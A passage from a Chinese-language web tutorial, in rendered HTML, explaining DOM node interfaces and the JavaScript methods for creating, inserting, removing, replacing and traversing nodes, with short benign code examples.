class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=&quot;http://www.example.com/page.html&quot;&gt;</span><br></pre></td></tr></table></figure><p>设置了以后，baseURI属性就返回<base>标签设置的值。</p><h2 id="Node-prototype-ownerDocument"><a href="#Node-prototype-ownerDocument" class="headerlink" title="Node.prototype.ownerDocument"></a>Node.prototype.ownerDocument</h2><p>Node.ownerDocument属性返回当前节点所在的顶层文档对象，即document对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var d = p.ownerDocument;</span><br><span class="line">d === document // true</span><br></pre></td></tr></table></figure><p>document对象本身的ownerDocument属性，返回null。</p><h2 id="Node-prototype-nextSibling"><a href="#Node-prototype-nextSibling" class="headerlink" title="Node.prototype.nextSibling"></a>Node.prototype.nextSibling</h2><p>Node.nextSibling属性返回紧跟在当前节点后面的第一个同级节点。如果当前节点后面没有同级节点，则返回null。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// HTML 代码如下</span><br><span class="line">// &lt;div id=&quot;d1&quot;&gt;hello&lt;/div&gt;&lt;div id=&quot;d2&quot;&gt;world&lt;/div&gt;</span><br><span class="line">var d1 = document.getElementById(&#x27;d1&#x27;);</span><br><span class="line">var d2 = document.getElementById(&#x27;d2&#x27;);</span><br><span class="line"></span><br><span class="line">d1.nextSibling === d2 // true</span><br></pre></td></tr></table></figure><p>上面代码中，d1.nextSibling就是紧跟在d1后面的同级节点d2。</p><p>注意，该属性还包括文本节点和注释节点（<!-- comment -->）。因此如果当前节点后面有空格，该属性会返回一个文本节点，内容为空格。</p><p>nextSibling属性可以用来遍历所有子节点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var el = document.getElementById(&#x27;div1&#x27;).firstChild;</span><br><span class="line"></span><br><span class="line">while (el !== null) &#123;</span><br><span class="line">  console.log(el.nodeName);</span><br><span class="line">  el = el.nextSibling;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码遍历div1节点的所有子节点。</p><h1 id="NodeList-接口"><a href="#NodeList-接口" class="headerlink" title="NodeList 接口"></a>NodeList 接口</h1><p>NodeList实例是一个类似数组的对象，它的成员是节点对象。通过以下方法可以得到NodeList实例。</p><ul><li>Node.childNodes</li><li>document.querySelectorAll()等节点搜索方法<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.body.childNodes instanceof NodeList // true</span><br></pre></td></tr></table></figure>NodeList实例很像数组，可以使用length属性和forEach方法。但是，它不是数组，不能使用pop或push之类数组特有的方法。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var children = document.body.childNodes;</span><br><span class="line"></span><br><span class="line">Array.isArray(children) // false</span><br><span class="line"></span><br><span class="line">children.length // 34</span><br><span class="line">children.forEach(console.log)</span><br></pre></td></tr></table></figure>上面代码中，NodeList 实例children不是数组，但是具有length属性和forEach方法。</li></ul><p>如果NodeList实例要使用数组方法，可以将其转为真正的数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var children = document.body.childNodes;</span><br><span class="line">var nodeArr = Array.prototype.slice.call(children);</span><br></pre></td></tr></table></figure><p>除了使用forEach方法遍历 NodeList 实例，还可以使用for循环。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var children = document.body.childNodes;</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; children.length; i++) &#123;</span><br><span class="line">  var item = children[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，NodeList 实例可能是动态集合，也可能是静态集合。所谓动态集合就是一个活的集合，DOM 删除或新增一个相关节点，都会立刻反映在 NodeList 实例。目前，只有Node.childNodes返回的是一个动态集合，其他的 NodeList 都是静态集合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var children = document.body.childNodes;</span><br><span class="line">children.length // 18</span><br><span class="line">document.body.appendChild(document.createElement(&#x27;p&#x27;));</span><br><span class="line">children.length // 19</span><br></pre></td></tr></table></figure><p>上面代码中，文档增加一个子节点，NodeList 实例children的length属性就增加了1。</p><h2 id="NodeList-prototype-length"><a href="#NodeList-prototype-length" class="headerlink" title="NodeList.prototype.length"></a>NodeList.prototype.length</h2><p>length属性返回 NodeList 实例包含的节点数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.querySelectorAll(&#x27;xxx&#x27;).length</span><br><span class="line">// 0</span><br></pre></td></tr></table></figure><p>上面代码中，document.querySelectorAll返回一个 NodeList 集合。对于那些不存在的 HTML 标签，length属性返回0。</p><h2 id="NodeList-prototype-forEach"><a href="#NodeList-prototype-forEach" class="headerlink" title="NodeList.prototype.forEach()"></a>NodeList.prototype.forEach()</h2><p>forEach方法用于遍历 NodeList 的所有成员。它接受一个回调函数作为参数，每一轮遍历就执行一次这个回调函数，用法与数组实例的forEach方法完全一致。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var children = document.body.childNodes;</span><br><span class="line">children.forEach(function f(item, i, list) &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;, this);</span><br></pre></td></tr></table></figure><p>上面代码中，回调函数f的三个参数依次是当前成员、位置和当前 NodeList 实例。forEach方法的第二个参数，用于绑定回调函数内部的this，该参数可省略。</p><h2 id="NodeList-prototype-item"><a href="#NodeList-prototype-item" class="headerlink" title="NodeList.prototype.item()"></a>NodeList.prototype.item()</h2><p>item方法接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.body.childNodes.item(0)</span><br></pre></td></tr></table></figure><p>上面代码中，item(0)返回第一个成员。</p><p>如果参数值大于实际长度，或者索引不合法（比如负数），item方法返回null。如果省略参数，item方法会报错。</p><p>所有类似数组的对象，都可以使用方括号运算符取出成员。一般情况下，都是使用方括号运算符，而不使用item方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.body.childNodes[0]</span><br></pre></td></tr></table></figure><h2 id="NodeList-prototype-keys-，NodeList-prototype-values-，NodeList-prototype-entries"><a href="#NodeList-prototype-keys-，NodeList-prototype-values-，NodeList-prototype-entries" class="headerlink" title="NodeList.prototype.keys()，NodeList.prototype.values()，NodeList.prototype.entries()"></a>NodeList.prototype.keys()，NodeList.prototype.values()，NodeList.prototype.entries()</h2><p>这三个方法都返回一个 ES6 的遍历器对象，可以通过for…of循环遍历获取每一个成员的信息。区别在于，keys()返回键名的遍历器，values()返回键值的遍历器，entries()返回的遍历器同时包含键名和键值的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var children = document.body.childNodes;</span><br><span class="line"></span><br><span class="line">for (var key of children.keys()) &#123;</span><br><span class="line">  console.log(key);</span><br><span class="line">&#125;</span><br><span class="line">// 0</span><br><span class="line">// 1</span><br><span class="line">// 2</span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">for (var value of children.values()) &#123;</span><br><span class="line">  console.log(value);</span><br><span class="line">&#125;</span><br><span class="line">// #text</span><br><span class="line">// &lt;script&gt;</span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">for (var entry of children.entries()) &#123;</span><br><span class="line">  console.log(entry);</span><br><span class="line">&#125;</span><br><span class="line">// Array [ 0, #text ]</span><br><span class="line">// Array [ 1, &lt;script&gt; ]</span><br><span class="line">// ...</span><br></pre></td></tr></table></figure><h1 id="ParentNode-接口"><a href="#ParentNode-接口" class="headerlink" title="ParentNode 接口"></a>ParentNode 接口</h1><p>如果当前节点是父节点，就会继承ParentNode接口。由于只有元素节点（element）、文档节点（document）和文档片段节点（documentFragment）拥有子节点，因此只有这三类节点会继承ParentNode接口。</p><h2 id="ParentNode-children"><a href="#ParentNode-children" class="headerlink" title="ParentNode.children"></a>ParentNode.children</h2><p>children属性返回一个HTMLCollection实例，成员是当前节点的所有元素子节点。该属性只读。</p><p>下面是遍历某个节点的所有元素子节点的示例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i &lt; el.children.length; i++) &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，children属性只包括元素子节点，不包括其他类型的子节点（比如文本子节点）。如果没有元素类型的子节点，返回值HTMLCollection实例的length属性为0。</p><p>另外，HTMLCollection是动态集合，会实时反映 DOM 的任何变化。</p><h2 id="ParentNode-firstElementChild"><a href="#ParentNode-firstElementChild" class="headerlink" title="ParentNode.firstElementChild"></a>ParentNode.firstElementChild</h2><p>firstElementChild属性返回当前节点的第一个元素子节点。如果没有任何元素子节点，则返回null。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.firstElementChild.nodeName</span><br><span class="line">// &quot;HTML&quot;</span><br></pre></td></tr></table></figure><p>上面代码中，document节点的第一个元素子节点是<HTML>。</p><h2 id="ParentNode-lastElementChild"><a href="#ParentNode-lastElementChild" class="headerlink" title="ParentNode.lastElementChild"></a>ParentNode.lastElementChild</h2><p>lastElementChild属性返回当前节点的最后一个元素子节点，如果不存在任何元素子节点，则返回null。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.lastElementChild.nodeName</span><br><span class="line">// &quot;HTML&quot;</span><br></pre></td></tr></table></figure><p>上面代码中，document节点的最后一个元素子节点是<HTML>（因为document只包含这一个元素子节点）。</p><h2 id="ParentNode-childElementCount"><a href="#ParentNode-childElementCount" class="headerlink" title="ParentNode.childElementCount"></a>ParentNode.childElementCount</h2><p>childElementCount属性返回一个整数，表示当前节点的所有元素子节点的数目。如果不包含任何元素子节点，则返回0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.body.childElementCount // 13</span><br><span class="line">ParentNode.append()，ParentNode.prepend()</span><br></pre></td></tr></table></figure><p>append方法为当前节点追加一个或多个子节点，位置是最后一个元素子节点的后面。</p><p>该方法不仅可以添加元素子节点，还可以添加文本子节点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var parent = document.body;</span><br><span class="line"></span><br><span class="line">// 添加元素子节点</span><br><span class="line">var p = document.createElement(&#x27;p&#x27;);</span><br><span class="line">parent.append(p);</span><br><span class="line"></span><br><span class="line">// 添加文本子节点</span><br><span class="line">parent.append(&#x27;Hello&#x27;);</span><br><span class="line"></span><br><span class="line">// 添加多个元素子节点</span><br><span class="line">var p1 = document.createElement(&#x27;p&#x27;);</span><br><span class="line">var p2 = document.createElement(&#x27;p&#x27;);</span><br><span class="line">parent.append(p1, p2);</span><br><span class="line"></span><br><span class="line">// 添加元素子节点和文本子节点</span><br><span class="line">var p = document.createElement(&#x27;p&#x27;);</span><br><span class="line">parent.append(&#x27;Hello&#x27;, p);</span><br></pre></td></tr></table></figure><p>注意，该方法没有返回值。</p><p>prepend方法为当前节点追加一个或多个子节点，位置是第一个元素子节点的前面。它的用法与append方法完全一致，也是没有返回值。</p><h1 id="ChildNode-接口"><a href="#ChildNode-接口" class="headerlink" title="ChildNode 接口"></a>ChildNode 接口</h1><p>remove方法用于从父节点移除当前节点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">el.remove()</span><br></pre></td></tr></table></figure><p>上面代码在 DOM 里面移除了el节点。</p><h2 id="ChildNode-before-，ChildNode-after"><a href="#ChildNode-before-，ChildNode-after" class="headerlink" title="ChildNode.before()，ChildNode.after()"></a>ChildNode.before()，ChildNode.after()</h2><p>before方法用于在当前节点的前面，插入一个或多个同级节点。两者拥有相同的父节点。</p><p>注意，该方法不仅可以插入元素节点，还可以插入文本节点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var p = document.createElement(&#x27;p&#x27;);</span><br><span class="line">var p1 = document.createElement(&#x27;p&#x27;);</span><br><span class="line"></span><br><span class="line">// 插入元素节点</span><br><span class="line">el.before(p);</span><br><span class="line"></span><br><span class="line">// 插入文本节点</span><br><span class="line">el.before(&#x27;Hello&#x27;);</span><br><span class="line"></span><br><span class="line">// 插入多个元素节点</span><br><span class="line">el.before(p, p1);</span><br><span class="line"></span><br><span class="line">// 插入元素节点和文本节点</span><br><span class="line">el.before(p, &#x27;Hello&#x27;);</span><br></pre></td></tr></table></figure><p>after方法用于在当前节点的后面，插入一个或多个同级节点，两者拥有相同的父节点。用法与before方法完全相同。</p><h2 id="ChildNode-replaceWith"><a href="#ChildNode-replaceWith" class="headerlink" title="ChildNode.replaceWith()"></a>ChildNode.replaceWith()</h2><p>replaceWith方法使用参数节点，替换当前节点。参数可以是元素节点，也可以是文本节点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var span = document.createElement(&#x27;span&#x27;);</span><br><span class="line">el.replaceWith(span);</span><br></pre></td></tr></table></figure><p>上面代码中，el节点将被span节点替换。</p><h1 id="节点创建型api"><a href="#节点创建型api" class="headerlink" title="节点创建型api"></a>节点创建型api</h1><p>在这里，我将常用的DOM操作api进行分类，首先要介绍的是创建型的api。这一类型的api，简而言之就是用来创建节点的。</p><h2 id="createElement"><a href="#createElement" class="headerlink" title="createElement"></a><strong>createElement</strong></h2><p>createElement通过传入指定的一个标签名来创建一个元素，如果传入的标签名是一个未知的，则会创建一个自定义的标签，注意：IE8以下浏览器不支持自定义标签。<br>使用如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var div = document.createElement(&quot;div&quot;);</span><br></pre></td></tr></table></figure><p>使用createElement要注意：通过createElement创建的元素并不属于html文档，它只是创建出来，并未添加到html文档中，要调用appendChild或insertBefore等方法将其添加到HTML文档树中。</p><h2 id="createTextNode"><a href="#createTextNode" class="headerlink" title="createTextNode"></a><strong>createTextNode</strong></h2><p>createTextNode用来创建一个文本节点，用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var textNode = document.createTextNode(&quot;一个TextNode&quot;);</span><br></pre></td></tr></table></figure><p>createTextNode接收一个参数，这个参数就是文本节点中的文本，和createElement一样，创建后的文本节点也只是独立的一个节点，同样需要appendChild将其添加到HTML文档树中</p><h2 id="cloneNode"><a href="#cloneNode" class="headerlink" title="cloneNode"></a>cloneNode</h2><p>cloneNode是用来返回调用方法的节点的一个副本，它接收一个bool参数，用来表示是否复制子元素，使用如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var parent = document.getElementById(&quot;parentElement&quot;); </span><br><span class="line">var parent2 = parent.cloneNode(true);// 传入true</span><br><span class="line">parent2.id = &quot;parent2&quot;;</span><br></pre></td></tr></table></figure><p>这段代码通过cloneNode复制了一份parent元素，其中cloneNode的参数为true，表示parent的子节点也被复制，如果传入false，则表示只复制了parent节点。<br>我们看看这个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;parent&quot;&gt;</span><br><span class="line">    我是父元素的文本</span><br><span class="line">    &lt;br/&gt;</span><br><span class="line">    &lt;span&gt;</span><br><span class="line">        我是子元素</span><br><span class="line">    &lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;button id=&quot;btnCopy&quot;&gt;复制&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">var parent = document.getElementById(&quot;parent&quot;);</span><br><span class="line">document.getElementById(&quot;btnCopy&quot;).onclick = function()&#123;</span><br><span class="line">var parent2 = parent.cloneNode(true);</span><br><span class="line">parent2.id = &quot;parent2&quot;;</span><br><span class="line">document.body.appendChild(parent2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码很简单，主要是绑定button事件，事件内容是复制了一个parent，修改其id，然后添加到文档中。<br>这里有几点要注意：<br>（1）和createElement一样，cloneNode创建的节点只是游离有html文档外的节点，要调用appendChild方法才能添加到文档树中<br>（2）如果复制的元素有id，则其副本同样会包含该id，由于id具有唯一性，所以在复制节点后必须要修改其id<br>（3）调用接收的bool参数最好传入，如果不传入该参数，不同浏览器对其默认值的处理可能不同</p><p>除此之外，我们还有一个需要注意的点：<br>如果被复制的节点绑定了事件，则副本也会跟着绑定该事件吗？这里要分情况讨论：<br>（1）如果是通过addEventListener或者比如onclick进行绑定事件，则副本节点不会绑定该事件<br>（2）如果是内联方式绑定比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div onclick=&quot;showParent()&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这样的话，副本节点同样会触发事件。</p><h2 id="createDocumentFragment"><a href="#createDocumentFragment" class="headerlink" title="createDocumentFragment"></a>createDocumentFragment</h2><p>createDocumentFragment方法用来创建一个DocumentFragment。在前面我们说到DocumentFragment表示一种轻量级的文档，它的作用主要是存储临时的节点用来准备添加到文档中。<br>createDocumentFragment方法主要是用于添加大量节点到文档中时会使用到。假设要循环一组数据，然后创建多个节点添加到文档中，比如示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul id=&quot;list&quot;&gt;&lt;/ul&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;添加多项&quot; id=&quot;btnAdd&quot; /&gt;</span><br><span class="line"></span><br><span class="line">document.getElementById(&quot;btnAdd&quot;).onclick = function()&#123;</span><br><span class="line">var list = document.getElementById(&quot;list&quot;);</span><br><span class="line">for(var i = 0;i &lt; 100; i++)&#123;</span><br><span class="line">var li = document.createElement(&quot;li&quot;);</span><br><span class="line">li.textContent = i;</span><br><span class="line">list.appendChild(li);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码将按钮绑定了一个事件，这个事件创建了100个li节点，然后依次将其添加HTML文档中。这样做有一个缺点：每次一创建一个新的元素，然后添加到文档树中，这个过程会造成浏览器的回流。所谓回流简单说就是指元素大小和位置会被重新计算，如果添加的元素太多，会造成性能问题。这个时候，就是使用createDocumentFragment了。<br>DocumentFragment不是文档树的一部分，它是保存在内存中的，所以不会造成回流问题。我们修改上面的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;btnAdd&quot;).onclick = function()&#123;</span><br><span class="line">var list = document.getElementById(&quot;list&quot;);</span><br><span class="line">var fragment = document.createDocumentFragment();</span><br><span class="line"></span><br><span class="line">for(var i = 0;i &lt; 100; i++)&#123;</span><br><span class="line">  var li = document.createElement(&quot;li&quot;);</span><br><span class="line">li.textContent = i;</span><br><span class="line">fragment.appendChild(li);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">list.appendChild(fragment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优化后的代码主要是创建了一个fragment，每次生成的li节点先添加到fragment，最后一次性添加到list，大家可以看示例</p><h2 id="创建型API总结"><a href="#创建型API总结" class="headerlink" title="创建型API总结"></a>创建型API总结</h2><p>创建型api主要包括createElement，createTextNode，cloneNode和createDocumentFragment四个方法，需要注意下面几点：</p><ol><li>它们创建的节点只是一个孤立的节点，要通过appendChild添加到文档中</li><li>cloneNode要注意如果被复制的节点是否包含子节点以及事件绑定等问题</li><li>使用createDocumentFragment来解决添加大量节点时的性能问题</li></ol><h1 id="页面修改型API"><a href="#页面修改型API" class="headerlink" title="页面修改型API"></a>页面修改型API</h1><p>前面我们提到创建型api，它们只是创建节点，并没有真正修改到页面内容，而是要调用appendChild来将其添加到文档树中。我在这里将这类会修改到页面内容归为一类。<br>修改页面内容的api主要包括：appendChild，insertBefore，removeChild，replaceChild。</p><h2 id="appendChild"><a href="#appendChild" class="headerlink" title="appendChild"></a>appendChild</h2><p>appendChild我们在前面已经用到多次，就是将指定的节点添加到调用该方法的节点的子元素的末尾。调用方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent.appendChild(child);</span><br></pre></td></tr></table></figure><p>child节点将会作为parent节点的最后一个子节点。<br>appendChild这个方法很简单，但是还有有一点需要注意：如果被添加的节点是一个页面中存在的节点，则执行后这个节点将会添加到指定位置，其原本所在的位置将移除该节点，也就是说不会同时存在两个该节点在页面上，相当于把这个节点移动到另一个地方。我们来看例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;child&quot;&gt;</span><br><span class="line">    要被添加的节点</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;div id=&quot;parent&quot;&gt;</span><br><span class="line">    要移动的位置</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input id=&quot;btnMove&quot; type=&quot;button&quot; value=&quot;移动节点&quot; /&gt;</span><br><span class="line"></span><br><span class="line">document.getElementById(&quot;btnMove&quot;).onclick = function()&#123;</span><br><span class="line">var child = document.getElementById(&quot;child&quot;);</span><br><span class="line">document.getElementById(&quot;parent&quot;).appendChild(child);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码主要是获取页面上的child节点，然后添加到指定位置，可以看到原本的child节点被移动到parent中了。<br>这里还有一个要注意的点：如果child绑定了事件，被移动时，它依然绑定着该事件。</p><h2 id="insertBefore"><a href="#insertBefore" class="headerlink" title="insertBefore"></a>insertBefore</h2><p>insertBefore用来添加一个节点到一个参照节点之前，用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parentNode.insertBefore(newNode,refNode);</span><br></pre></td></tr></table></figure><p>parentNode表示新节点被添加后的父节点<br>newNode表示要添加的节点<br>refNode表示参照节点，新节点会添加到这个节点之前<br>我们来看这个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;parent&quot;&gt;</span><br><span class="line">    父节点</span><br><span class="line">    &lt;div id=&quot;child&quot;&gt;</span><br><span class="line">        子元素</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;insertNode&quot; value=&quot;插入节点&quot; /&gt;</span><br><span class="line"></span><br><span class="line">var parent = document.getElementById(&quot;parent&quot;);</span><br><span class="line">var child = document.getElementById(&quot;child&quot;);</span><br><span class="line">document.getElementById(&quot;insertNode&quot;).onclick = function()&#123;</span><br><span class="line">var newNode = document.createElement(&quot;div&quot;);</span><br><span class="line">newNode.textContent = &quot;新节点&quot;</span><br><span class="line">parent.insertBefore(newNode,child);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码创建了一个新节点，然后添加到child节点之前。<br>和appendChild一样，如果插入的节点是页面上的节点，则会移动该节点到指定位置，并且保留其绑定的事件。</p><p>关于第二个参数参照节点还有几个注意的地方：</p><ol><li>refNode是必传的，如果不传该参数会报错</li><li>如果refNode是undefined或null，则insertBefore会将节点添加到子元素的末尾</li></ol><h2 id="removeChild"><a href="#removeChild" class="headerlink" title="removeChild"></a>removeChild</h2><p>removeChild顾名思义，就是删除指定的子节点并返回，用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var deletedChild = parent.removeChild(node);</span><br></pre></td></tr></table></figure><p>deletedChild指向被删除节点的引用，它等于node，被删除的节点仍然存在于内存中，可以对其进行下一步操作。<br>注意：如果被删除的节点不是其子节点，则程序将会报错。我们可以通过下面的方式来确保可以删除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(node.parentNode)&#123;</span><br><span class="line">    node.parentNode.removeChild(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过节点自己获取节点的父节点，然后将自身删除。</p><h2 id="replaceChild"><a href="#replaceChild" class="headerlink" title="replaceChild"></a>replaceChild</h2><p>replaceChild用于使用一个节点替换另一个节点，用法如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent.replaceChild(newChild,oldChild);</span><br></pre></td></tr></table></figure><p>newChild是替换的节点，可以是新的节点，也可以是页面上的节点，如果是页面上的节点，则其将被转移到新的位置<br>oldChild是被替换的节点</p><p>页面修改型API总结<br>页面修改型api主要是这四个接口，要注意几个特点：</p><ol><li>不管是新增还是替换节点，如果新增或替换的节点是原本存在页面上的，则其原来位置的节点将被移除，也就是说同一个节点不能存在于页面的多个位置</li><li>节点本身绑定的事件会不会消失，会一直保留着。</li></ol><h1 id="节点查询型API"><a href="#节点查询型API" class="headerlink" title="节点查询型API"></a>节点查询型API</h1><p>节点查询型API也是非常常用的api，下面我们分别说明一下每一个api的使用。</p><h2 id="document-getElementById"><a href="#document-getElementById" class="headerlink" 